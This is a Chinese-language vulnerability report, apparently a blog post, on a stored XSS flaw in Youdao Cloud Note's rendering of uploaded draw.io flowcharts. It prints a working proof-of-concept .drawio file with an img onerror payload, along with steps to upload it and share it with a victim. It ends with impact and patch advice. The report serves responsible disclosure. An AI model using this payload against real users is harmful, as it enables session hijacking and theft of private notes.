---
layout: post
title:  "中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞"
date:   2024-03-17 10:26:18 +0800
categories: xss
---

## Name

> 有道云笔记网页端渲染流程图存在存储型XSS漏洞

## Weakness
> 存储型XSS

## Severity
> 中危

## URL
- POC网页: [https://note.youdao.com/s/QJo17hDz](https://note.youdao.com/s/QJo17hDz)
- 视频链接：POC视频链接：[https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ](https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ) 提取码：1314

## Key Payload

```
<mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device">
  <diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1">
    <mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <UserObject label="&lt;select>&lt;iframe>&lt;/select>&lt;img src=x onerror=alert(document.domain)>" tooltip="" id="kX_el6IuBEZSOJuKbBye-1">
          <mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
            <mxGeometry x="150" y="170" width="90" height="40" as="geometry" />
          </mxCell>
        </UserObject>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
```

## Summary

网易有道云笔记可以上传流程图笔记，该笔记是xml格式的drawio文件。有道云笔记采用drawio插件对该文件进行渲染，然而，该插件版本过时并且存在存储型XSS漏洞。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。

### Detail

#### Trigger
1. 将下面payload保存为drawio文件，命名为xss.drawio。

    ```
    <mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device">
    <diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1">
        <mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0">
        <root>
            <mxCell id="0" />
            <mxCell id="1" parent="0" />
            <UserObject label="&lt;select>&lt;iframe>&lt;/select>&lt;img src=x onerror=alert(document.domain)>" tooltip="" id="kX_el6IuBEZSOJuKbBye-1">
            <mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1">
                <mxGeometry x="150" y="170" width="90" height="40" as="geometry" />
            </mxCell>
            </UserObject>
        </root>
        </mxGraphModel>
    </diagram>
    </mxfile>
    ```

2. 登录有道云笔记，[https://note.youdao.com/](https://note.youdao.com/). 点击左上侧“新建”，选择“上传文件”，将上一步的文件上传。

    ![save](/assets/images/youdaoyun2/save.png)

3. 上传后，打开上传的流程图，xss触发。
    
    ![drawxss](/assets/images/youdaoyun2/drawxss.png)

4. 将该笔记分享，发送给受害者打开，同样触发xss。

    ![share](/assets/images/youdaoyun2/share.png)

5. 原因：drawio原始文件中，没有对UserObject元素的label字段进行过滤，导致label字段的xss得到执行。详见：[https://github.com/jgraph/drawio/discussions/2791](https://github.com/jgraph/drawio/discussions/2791)

### Proof
请提供截图或视频

POC视频链接：[https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ](https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ)
提取码：1314

## Impact

该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。

## Patch advice

1. 升级渲染drawio的插件到最新版本

